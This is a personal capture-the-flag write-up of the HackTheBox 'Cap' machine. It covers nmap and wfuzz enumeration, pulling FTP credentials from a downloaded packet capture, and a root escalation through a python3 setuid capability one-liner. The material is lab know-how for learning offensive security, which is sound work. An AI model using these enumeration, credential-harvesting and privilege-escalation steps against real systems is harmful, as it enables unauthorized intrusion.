Hello Reader!! In this writeup we are going to talk about cap hackthebox machine which is linux based box.<br>

As usual lets start our enumeration with `nmap`
```bash
──(mrgrep㉿kali)-[~/Desktop/htb/cap]
└─$ sudo nmap 10.10.10.245                  
[sudo] password for mrgrep: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 09:57 IST
Nmap scan report for 10.10.10.245
Host is up (0.79s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.86 seconds
```
As we can clearly see here 3 ports are open so I tried FTP anonymous login check but it failed :(
Also, after opening ip in browser(as port 80 is open) got to know that User *Nathan* is logged in.
Now, lets try if we can find any interesting file so let's us `dirb` for that.
```bash
┌──(mrgrep㉿kali)-[~/Desktop/htb/cap]
└─$ dirb http://10.10.10.245                                          255 ⨯ 1 ⚙

+ http://10.10.10.245/data (CODE:302|SIZE:208)

```
From the above results we can clearly see that we have 3 files `data`, `ip`, and `netstat`. let's check what's in there.
<br>
After visiting `/data` we got nothing. So, decided to check `/ip` and here we go

We got the page which is showing some output for ipconfig command so let's  check netstat page too.
<img src="/assets/img/cap3.png" alt="CRTP" width="500" height="333"> <br>
we can clearly see netstat command output. but nothing interesting here :(<br>
Let's use wfuzz with medium wordlist to check if we are missing anything.
```bash
┌──(mrgrep㉿kali)-[~/Desktop/htb/cap]
└─$ wfuzz -u http://10.10.10.245/data/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --hc 302,404
```
after running it I got many files so I started checking one by one then I saw a file named `00` exact path was `/data/00` so I decided to visit the page.
<img src="/assets/img/cap4.png" alt="CRTP" width="500" height="333"><br>
and we can see the download button so I downloaded the file and opened it in the wireshark.
After analyzing I saw lots of FTP Traffic so I Filtered traffic as FTP and here we go<br>

We can clearly see those credentials so I logged in to the FTP with those creds.
```bash
──(mrgrep㉿kali)-[~/Desktop/htb/cap]
└─$ ftp 10.10.10.245                                                  127 ⨯ 2 ⚙

```

if you notice we got our `user.txt` flag.
<br>Also for ssh credentials are same so after logging into ssh I ran [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script and got the following interested output.
<img src="/assets/img/cap6.png" alt="CRTP" width="500" height="333">
we can clearly see the capabilities issue and machine name also suggest the same :D
<br> SO to confirm let's check
```bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("whoami")'
root
```
and here we go....<br>
